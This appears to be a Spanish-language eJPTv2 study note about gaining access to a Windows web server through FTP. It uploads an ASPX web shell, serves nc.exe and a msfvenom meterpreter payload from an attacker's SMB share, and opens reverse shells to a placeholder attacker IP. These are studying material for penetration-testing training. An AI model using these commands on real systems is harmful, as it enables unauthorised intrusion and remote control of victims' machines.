Normalmente tendremos acceso a FTP, este servicio y el puerto 80 suelen ir muy vinculados entre sí. 

Al tener acceso a este servicio podremos subir archivos y verlos desde el navegador, tendremos que subir un archivo malicioso que nos permita ejecutar comandos desde el navegador.

En Kali linux si usamos el siguiente comando:

````
find / -name cmdasp.aspx 2>/dev/null
`````

Usaremos el comando `cp` para pasarnos ese archivo que nos resulte de la consulta anterior al escritorio para posteriormente subirlo en el servidor ftp mediante `put`.

Al acceder al archivo desde el navegador podremos ejecutar comandos.

Para conseguir un acceso remoto a la máquina tendremos que hacer lo siguiente:

En primer lugar, conseguir el archivo  `nc.exe`

````
find / -name nc.exe 2>/dev/null
`````

La idea es alojar un recurso compartido en la red con el archivo para pasarlo a la máquina víctima.

Para levantar un recurso compartido necesitamos:

````
impacket-smbserver recurso $(pwd) -smb2support
`````

Activaremos la escucha de [[eJPTv2/CONCEPTOS BÁSICOS/1. Netcat]]

Volveremos al navegador en el sitio donde podemos ejecutar comandos y pondremos lo siguiente:

````
\\<IPATACANTE>\recurso\nc.exe -e cmd.exe <IPATACANTE> 443
`````

Mediante esto se nos abrirá una shell en la escucha de netcat. Normalmente se nos abrirá una sesión de administrador, en caso de que no sea así haremos los siguiente:

Crearemos un archivo meterpreter:

````
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Atacante> LPORT=444 (el que queramos) -f exe -o shell.exe
`````

Si está curl o wget instalados lo compartiremos tal y com se explicó en [[eJPTv2/CONCEPTOS BÁSICOS/2. Compartir archivos con servidor http]]. En caso contrario podremos levantar otro recurso compartido y en la máquina victima ir a una carpeta con permiso de escritura. <span style="color:rgb(0, 176, 80)"><span style="color:rgb(255, 192, 0)">(CARPETA TEMP)</span> </span>.

Posterior a esto haremos un copy:

````
copy \\<IPATACANTE>\recurso\shell.exe shell.exe
`````

Abriremos msfconsole y haremos un `use multi/handler`. Indicaremos el LHOST y el LPORT que hubiéramos puesto al crearlo.

En PAYLOAD (windows/meterpreter/reverse_tcp) tendremos que poner el mismo que habíamos puesto al principio cuando se ha creado.